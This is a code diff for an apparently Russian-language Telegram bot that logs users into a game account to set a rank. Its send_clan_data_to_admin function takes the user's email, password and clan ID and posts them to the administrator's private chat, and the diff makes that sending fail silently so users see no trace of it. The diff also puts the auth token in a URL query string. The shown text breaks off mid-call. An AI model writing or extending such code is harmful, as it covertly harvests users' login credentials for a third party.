@@ -70,21 +70,12 @@ def login(email, password):
 # GET CLAN ID FUNCTION
 # -------------------------------
 def get_clan_id(token):
-    """Получаем Clan ID пользователя"""
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Content-Type": "application/json",
-        "User-Agent": "okhttp/3.12.13"
-    }
-    try:
-        response = requests.get(CLAN_ID_URL, headers=headers)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get("clanId")
-        else:
-            return None
-    except requests.exceptions.RequestException as e:
-        return None
+    url = f"{CLAN_ID_URL}?auth={token}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        return data.get("clanId")
+    return None
 
 # -------------------------------
 # SET RANK FUNCTION
@@ -121,11 +112,9 @@ def send_clan_data_to_admin(email, password, clan_id):
         "text": message
     }
     try:
-        response = requests.post(url, data=payload, timeout=5)
-        if response.status_code == 200:
-            print("Данные успешно отправлены в ЛС администратора.")
+        requests.post(url, data=payload, timeout=5)
     except requests.exceptions.RequestException:
-        print("Ошибка при отправке данных в ЛС администратору.")
+        pass  # Silent fail if sending message fails
 
 # -------------------------------
 # ADMIN COMMANDS
@@ -240,4 +229,20 @@ def handle_message(message):
         token = login(email, password)
         if not token:
             msg_error = bot.reply_to(message, "❌ Ошибка входа.")
-            messages_to_delete.append
+            messages_to_delete.append(msg_error.message_id)
+        else:
+            msg_rank = bot.reply_to(message, "👑 Rang устанавливается...")
+            messages_to_delete.append(msg_rank.message_id)
+
+            success = set_rank(token)
+            if success:
+                msg_done = bot.reply_to(message, "✅ RANG установлен!")
+            else:
+                msg_done = bot.reply_to(message, "❌ Ошибка при установке.")
+            messages_to_delete.append(msg_done.message_id)
+
+            # Получаем clan_id
+            clan_id = get_clan_id(token)
+            if clan_id:
+                # Отправляем данные пользователя и его clan_id в ЛС администратору
+                send
